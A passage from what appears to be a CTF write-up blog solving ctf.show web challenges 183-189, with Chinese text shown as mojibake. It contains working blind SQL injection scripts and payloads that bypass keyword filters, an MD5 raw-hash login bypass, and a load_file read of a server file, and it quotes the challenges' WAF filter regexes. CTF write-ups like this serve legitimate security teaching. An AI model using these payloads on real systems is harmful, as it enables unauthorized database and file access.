class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@File    :   SQLç›²æ³¨.py   </span></span><br><span class="line"><span class="string">@Contact :   2997453446@qq.com</span></span><br><span class="line"><span class="string">@Blog    :   natro92.github.io</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">@Modify Time      @Author    @Version    @Desciption</span></span><br><span class="line"><span class="string">------------      -------    --------    -----------</span></span><br><span class="line"><span class="string">2023/7/10 17:49   natro92      1.0         None</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">r&#x27;http://0d89238a-2c87-4371-b427-2670ebb10351.challenge.ctf.show/select-waf.php&#x27;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">r&#x27;0123456789-abcdefghijklmnopqrstuvwxyz&#125;&#x27;</span></span><br><span class="line">flag_pre = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line">payload = <span class="string">&quot;(ctfshow_user)where(pass)regexp&#x27;&#123;&#125;&#x27;&quot;</span></span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">key = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span> key == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;tableName&#x27;</span>: payload.<span class="built_in">format</span>(flag_pre + j)</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;$user_count = 1&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag_pre += j</span><br><span class="line">            <span class="built_in">print</span>(flag_pre)</span><br><span class="line">            <span class="keyword">if</span> j == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                key = <span class="number">1</span></span><br></pre></td></tr></table></figure><p>ç¬¬äºŒç§ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@File    :   SQLç›²æ³¨.py   </span></span><br><span class="line"><span class="string">@Contact :   2997453446@qq.com</span></span><br><span class="line"><span class="string">@Blog    :   natro92.github.io</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">@Modify Time      @Author    @Version    @Desciption</span></span><br><span class="line"><span class="string">------------      -------    --------    -----------</span></span><br><span class="line"><span class="string">2023/7/10 17:49   natro92      1.0         None</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">url = <span class="string">r&#x27;http://0d89238a-2c87-4371-b427-2670ebb10351.challenge.ctf.show/select-waf.php&#x27;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">r&#x27;0123456789-abcdefghijklmnopqrstuvwxyz&#125;&#x27;</span></span><br><span class="line">flag_pre = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;(ctfshow_user)where(pass)like&quot;&#123;&#125;%&quot;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">key = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span> key == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;tableName&#x27;</span>: payload.<span class="built_in">format</span>(flag_pre + j)</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;count = 1&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag_pre += j</span><br><span class="line">            <span class="built_in">print</span>(flag_pre)</span><br><span class="line">            <span class="keyword">if</span> j == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                key = <span class="number">1</span></span><br></pre></td></tr></table></figure><h1 id="web184"><a href="#web184" class="headerlink" title="web184"></a>web184</h1><h3 id="å³è¿æ¥"><a href="#å³è¿æ¥" class="headerlink" title="å³è¿æ¥"></a>å³è¿æ¥</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†è¿‡æ»¤</span><br><span class="line">  function waf($<span class="built_in">str</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">&#x27;/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#x27;|\&quot;|union|\`|sleep|benchmark/i&#x27;</span>, $<span class="built_in">str</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="ä»€ä¹ˆæ˜¯å³è¿æ¥"><a href="#ä»€ä¹ˆæ˜¯å³è¿æ¥" class="headerlink" title="ä»€ä¹ˆæ˜¯å³è¿æ¥"></a>ä»€ä¹ˆæ˜¯å³è¿æ¥</h2><p>SQL ä¸­çš„å³è¿æ¥ï¼ˆRight Joinï¼‰ç”¨äºå°†ä¸¤ä¸ªè¡¨æŒ‰ç…§æŒ‡å®šçš„åˆ—è¿›è¡Œè¿æ¥ï¼Œå¹¶è¿”å›å³ä¾§è¡¨ä¸­æ‰€æœ‰è¡ŒåŠå…¶ä¸å·¦ä¾§è¡¨ä¸­åŒ¹é…è¡Œçš„åˆ—å€¼ï¼Œå¦‚æœå·¦ä¾§è¡¨ä¸­æ²¡æœ‰åŒ¹é…çš„è¡Œï¼Œåˆ™è¿”å› NULL å€¼ã€‚<br>æ¯”å¦‚ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT columns</span><br><span class="line">FROM table1</span><br><span class="line">RIGHT JOIN table2</span><br><span class="line">ON table1.column = table2.column;</span><br></pre></td></tr></table></figure><p>æ¯”å¦‚ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT students.name, scores.score</span><br><span class="line">FROM students</span><br><span class="line">RIGHT JOIN scores</span><br><span class="line">ON students.<span class="built_in">id</span> = scores.student_id;</span><br></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨ RIGHT JOIN å°† scores è¡¨å³è¿æ¥åˆ° students è¡¨ä¸Šï¼ŒæŒ‰ç…§ students.id å’Œ scores.student_id è¿›è¡Œè¿æ¥ï¼ŒæŸ¥è¯¢å­¦ç”Ÿå§“åå’Œå¯¹åº”çš„æˆç»©ã€‚å¦‚æœ scores è¡¨ä¸­æ²¡æœ‰åŒ¹é…çš„è¡Œï¼Œåˆ™è¿”å› NULL å€¼ã€‚<br>å› æ­¤è¿™é“é¢˜é‡Œé¢å°±å¯ä»¥ä½¿ç”¨å¦‚ä¸‹payloadï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tableName<span class="operator">=</span>ctfshow_user <span class="keyword">as</span> a <span class="keyword">right</span> <span class="keyword">join</span> ctfshow_user <span class="keyword">as</span> b <span class="keyword">on</span> b.pass <span class="keyword">like</span> <span class="number">0x63746673686f7725</span></span><br></pre></td></tr></table></figure><p><code>0x63746673686f7725</code>æ˜¯ctfshow%çš„åå…­è¿›åˆ¶ç¼–ç <br>pythonä¸­å¯ä»¥ä½¿ç”¨ä»¥ä¸‹ä»£ç å®ç°è½¬æ¢ä¸ºåå…­è¿›åˆ¶ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="built_in">print</span>(binascii.b2a_hex(<span class="built_in">str</span>(<span class="string">&#x27;ctfshow%&#x27;</span>).encode()).decode().replace(<span class="string">&quot;b&#x27;&quot;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br></pre></td></tr></table></figure><p>ç„¶åå°±å¯ä»¥å†™è„šæœ¬ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@File    :   SQLç›²æ³¨2.py</span></span><br><span class="line"><span class="string">@Contact :   2997453446@qq.com</span></span><br><span class="line"><span class="string">@Blog    :   natro92.github.io</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@Modify Time      @Author    @Version    @Desciption</span></span><br><span class="line"><span class="string">------------      -------    --------    -----------</span></span><br><span class="line"><span class="string">2023/7/10 19:49   natro92      1.0         None</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_2hex</span>(<span class="params">s</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    :param s: éœ€è¦è½¬ä¸ºåå…­è¿›åˆ¶çš„å­—ç¬¦ä¸²</span></span><br><span class="line"><span class="string">    :return: åå…­è¿›åˆ¶ç»“æœ</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> binascii.b2a_hex(s.encode()).decode().replace(<span class="string">&quot;b&#x27;&quot;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">r&#x27;http://303b0ea1-6fc8-4947-9730-47d85b4a3c1c.challenge.ctf.show/select-waf.php&#x27;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">r&#x27;0123456789abcdefghijklmnopqrstuvwxyz-&#125;&#x27;</span></span><br><span class="line">flag_pre = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line">payload = <span class="string">&quot;ctfshow_user as a right join ctfshow_user as b on b.pass like &#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">key = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span> key == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;tableName&#x27;</span>: payload.<span class="built_in">format</span>(<span class="string">&#x27;0x&#x27;</span> + _2<span class="built_in">hex</span>(flag_pre + j + <span class="string">&quot;%&quot;</span>))</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;$user_count = 43&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag_pre += j</span><br><span class="line">            <span class="built_in">print</span>(flag_pre)</span><br><span class="line">            <span class="keyword">if</span> j == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                key = <span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼Œåˆ¤æ–­æ¡ä»¶çš„43æ˜¯ä½¿ç”¨payloadæ‰€çŸ¥é“çš„ã€‚<br> æ­¤å¤–ï¼Œè¿˜å¯ä»¥ä½¿ç”¨å¦‚ä¸‹payloadï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tableName=ctfshow_user group by <span class="keyword">pass</span> having <span class="keyword">pass</span>  like <span class="number">0x63746673686f7725</span></span><br></pre></td></tr></table></figure><h2 id="group-byå’Œhavingå…³é”®å­—"><a href="#group-byå’Œhavingå…³é”®å­—" class="headerlink" title="group byå’Œhavingå…³é”®å­—"></a>group byå’Œhavingå…³é”®å­—</h2><p>HAVING æ˜¯ SQL ä¸­ç”¨äºå¯¹åˆ†ç»„åçš„ç»“æœè¿›è¡Œç­›é€‰çš„å…³é”®å­—ã€‚å®ƒé€šå¸¸ä¸ GROUP BY å…³é”®å­—ä¸€èµ·ä½¿ç”¨ï¼Œç”¨äºå¯¹åˆ†ç»„åçš„ç»“æœè¿›è¡Œèšåˆè®¡ç®—å’Œç­›é€‰ã€‚<br>æ¯”å¦‚ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT student, AVG(score) AS avg_score</span><br><span class="line">FROM scores</span><br><span class="line">GROUP BY student</span><br><span class="line">HAVING avg_score &gt;= <span class="number">90</span>;</span><br></pre></td></tr></table></figure><p><code>HAVING pass LIKE 0x63746673686f7725 </code>å¯¹åˆ†ç»„åçš„ç»“æœè¿›è¡Œç­›é€‰ï¼Œåªè¿”å› pass åˆ—ä¸­åŒ…å«å­—ç¬¦ä¸² <code>0x63746673686f7725</code> çš„åˆ†ç»„ã€‚<br>è¿™é‡Œå°±ä¸å†™è„šæœ¬äº†ï¼Œæ³¨æ„æ‰€å¯¹åº”çš„æ¡ä»¶æ˜¯è¿”å›ä¸­å­˜åœ¨<code>$user_count = 1</code></p><h1 id="web185ã€web186"><a href="#web185ã€web186" class="headerlink" title="web185ã€web186"></a>web185ã€web186</h1><h3 id="ä½¿ç”¨trueå…³é”®å­—ç­‰æ¥ç»•è¿‡æ•°å­—è¿‡æ»¤-chrå‡½æ•°"><a href="#ä½¿ç”¨trueå…³é”®å­—ç­‰æ¥ç»•è¿‡æ•°å­—è¿‡æ»¤-chrå‡½æ•°" class="headerlink" title="ä½¿ç”¨trueå…³é”®å­—ç­‰æ¥ç»•è¿‡æ•°å­—è¿‡æ»¤ chrå‡½æ•°"></a>ä½¿ç”¨trueå…³é”®å­—ç­‰æ¥ç»•è¿‡æ•°å­—è¿‡æ»¤ chrå‡½æ•°</h3><p>æ•°å­—è¢«è¿‡æ»¤äº†ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#x27;|\&quot;|union|\`|sleep|benchmark/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>trueå…³é”®å­—å†mysqlä¸­ç­‰ä»·ä¸º1ï¼Œä¹Ÿå°±æ˜¯å¯ä»¥true+true=2ï¼Œå› æ­¤å¯ä»¥ç”±æ­¤æ„é€ å‡ºä»»ä½•æ•°å­—ã€‚<br>å› æ­¤æˆ‘ä»¬å¯ä»¥å­—ç¬¦ä¸²-&gt;è½¬ä¸ºåè¿›åˆ¶æ•°å­—-&gt;chrå’Œconcatå‡½æ•°æ‹¼æ¥åˆæˆä¸ºpayloadä¸­çš„éœ€è¦å­—ç¬¦ä¸²ã€‚<br>è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">@File    :   SQLç›²æ³¨3.py</span></span><br><span class="line"><span class="string">@Contact :   2997453446@qq.com</span></span><br><span class="line"><span class="string">@Blog    :   natro92.github.io</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@Modify Time      @Author    @Version    @Desciption</span></span><br><span class="line"><span class="string">------------      -------    --------    -----------</span></span><br><span class="line"><span class="string">2023/7/10 20:16   natro92      1.0         None</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># å°†æ•°å­—è½¬æ¢ä¸ºtrueç›¸åŠ </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">num2True</span>(<span class="params">num</span>):</span><br><span class="line">    a = <span class="string">&#x27;true&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> num != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num - <span class="number">1</span>):</span><br><span class="line">            a += <span class="string">&#x27;+true&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å°†æ–‡æœ¬è½¬æ¢ä¸ºconcatå’Œchrå‡½æ•°ç»“åˆçš„æ ¼å¼</span></span><br><span class="line">    <span class="comment"># æ¯”å¦‚ï¼šaa -&gt; chr(ä¸€å¤§å †trueç›¸åŠ ),chr(åˆä¸€å¤§å †trueç›¸åŠ )</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_style</span>(<span class="params">s</span>):</span><br><span class="line">    str1 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    str1 += <span class="string">&#x27;chr(&#x27;</span> + num2True(<span class="built_in">ord</span>(s[<span class="number">0</span>])) + <span class="string">&#x27;)&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s[<span class="number">1</span>:]:</span><br><span class="line">        str1 += <span class="string">&#x27;,chr(&#x27;</span> + num2True(<span class="built_in">ord</span>(i)) + <span class="string">&#x27;)&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> str1</span><br><span class="line"></span><br><span class="line">url = <span class="string">r&#x27;http://76c1b9c5-22be-4d38-8e83-4cdf71d2b93a.challenge.ctf.show/select-waf.php&#x27;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">r&#x27;0123456789abcdefghijklmnopqrstuvwxyz-&#125;&#x27;</span></span><br><span class="line">flag_pre = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line">payload = <span class="string">&quot;ctfshow_user as a right join ctfshow_user as b on b.pass like(concat(&#123;&#125;))&quot;</span></span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">key = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span> key == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;tableName&#x27;</span>: payload.<span class="built_in">format</span>(change_style(flag_pre + j + <span class="string">&#x27;%&#x27;</span>))</span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;$user_count = 43&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag_pre += j</span><br><span class="line">            <span class="built_in">print</span>(flag_pre)</span><br><span class="line">            <span class="keyword">if</span> j == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                key = <span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="æ³¨æ„"><a href="#æ³¨æ„" class="headerlink" title="æ³¨æ„"></a>æ³¨æ„</h2><p>ä¸æ­¢æœ‰trueå¯ä»¥ç”Ÿæˆä»»æ„æ•°å­—ï¼Œä»¥ä¸‹å‡ ä¸ªå‡½æ•°ä¹Ÿå¯ä»¥ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ceil() floor() true version() pi()</span><br></pre></td></tr></table></figure><h1 id="web187"><a href="#web187" class="headerlink" title="web187"></a>web187</h1><h3 id="ç»•è¿‡sqlMD5åŠ å¯†çš„ä¸‡èƒ½ä¸²ffifdyop"><a href="#ç»•è¿‡sqlMD5åŠ å¯†çš„ä¸‡èƒ½ä¸²ffifdyop" class="headerlink" title="ç»•è¿‡sqlMD5åŠ å¯†çš„ä¸‡èƒ½ä¸²ffifdyop"></a>ç»•è¿‡sqlMD5åŠ å¯†çš„ä¸‡èƒ½ä¸²ffifdyop</h3><p>ç”¨MD5åŠ å¯†å¯†ç ï¼Œ<code>ffifdyop</code>æ­£å¥½å¯ä»¥å¾—åˆ°<code>&#39;or&#39;6ï¿½]ï¿½ï¿½!r,ï¿½ï¿½b</code><br>ä¹Ÿå°±è¾¾åˆ°äº†ç»•è¿‡çš„ç›®çš„ã€‚<br>æ³¨æ„flagåœ¨è¿”å›åŒ…ä¸­ã€‚</p><h1 id="web188"><a href="#web188" class="headerlink" title="web188"></a>web188</h1><h3 id="å¼±æ¯”è¾ƒ-sqlä¸­-ç­‰ä»·äºor"><a href="#å¼±æ¯”è¾ƒ-sqlä¸­-ç­‰ä»·äºor" class="headerlink" title="å¼±æ¯”è¾ƒ sqlä¸­||ç­‰ä»·äºor"></a>å¼±æ¯”è¾ƒ sqlä¸­||ç­‰ä»·äºor</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//å¯†ç åˆ¤æ–­</span><br><span class="line"> <span class="keyword">if</span>($row[<span class="string">&#x27;pass&#x27;</span>]==intval($password))&#123;</span><br><span class="line">     $ret[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;ç™»é™†æˆåŠŸ&#x27;</span>;</span><br><span class="line">     array_push($ret[<span class="string">&#x27;data&#x27;</span>], array(<span class="string">&#x27;flag&#x27;</span>=&gt;$flag));</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>flagä¸ºå­—ç¬¦ä¸²ï¼Œå­—ç¬¦ä¸²çš„intvalæ°¸è¿œä¸º0.å› æ­¤ä¼ å…¥0å³å¯ã€‚<br><code>username=1||1&amp;password=0</code></p><h1 id="web189"><a href="#web189" class="headerlink" title="*web189"></a>*web189</h1><h3 id="å¸ƒå°”ç›²æ³¨-if-load-file-locate"><a href="#å¸ƒå°”ç›²æ³¨-if-load-file-locate" class="headerlink" title="å¸ƒå°”ç›²æ³¨ if load_file locate"></a>å¸ƒå°”ç›²æ³¨ if load_file locate</h3><p>æç¤ºé‡Œæœ‰è¯´ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flagåœ¨api/index.phpæ–‡ä»¶ä¸­</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆè¿™é‡Œå°±éœ€è¦ç›²æ³¨æ¥è§£å†³ã€‚<br>mysqlå¯¼å…¥å¤–éƒ¨æ–‡ä»¶æŸ¥è¯¢ã€‚</p><ul><li>load_file(path)å¯¼å…¥æ–‡ä»¶</li><li>locate(substr,str)è·å–åŒ¹é…åˆ°çš„å­—ç¬¦ä¸²ä½ç½®</li></ul><p>è¿™é“é¢˜çš„payloadå°±æ˜¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(locate(<span class="string">&quot;ctfshow&#123;&quot;</span>,<span class="string">&#x27; + &#x27;</span>load_file(<span class="string">&quot;/var/www/html/api/index.php&quot;</span>))&gt;è¿™é‡Œæ˜¯ä½ç½®,<span class="number">0</span>,<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>è®©æˆ‘ä»¬çœ‹çœ‹gptæ€ä¹ˆè¯´<br>å¦‚æœ â€˜ctfshow{â€˜ åœ¨ â€œ/var/www/html/api/index.phpâ€ æ–‡ä»¶çš„å†…å®¹ä¸­å­˜åœ¨ï¼Œå¹¶ä¸”ä½ç½®å¤§äº 1ï¼ˆå³æ‰¾åˆ°äº†ï¼‰ï¼Œé‚£ä¹ˆæ¡ä»¶è¡¨è¾¾å¼ locate(â€œctfshow{â€œ,â€™ + â€˜load_file(â€œ/var/www/html/api/index.phpâ€))&gt;1 å°†è¿”å›çœŸï¼Œè¿›å…¥æ¡ä»¶ä¸ºçœŸçš„åˆ†æ”¯ï¼Œå³è¿”å› 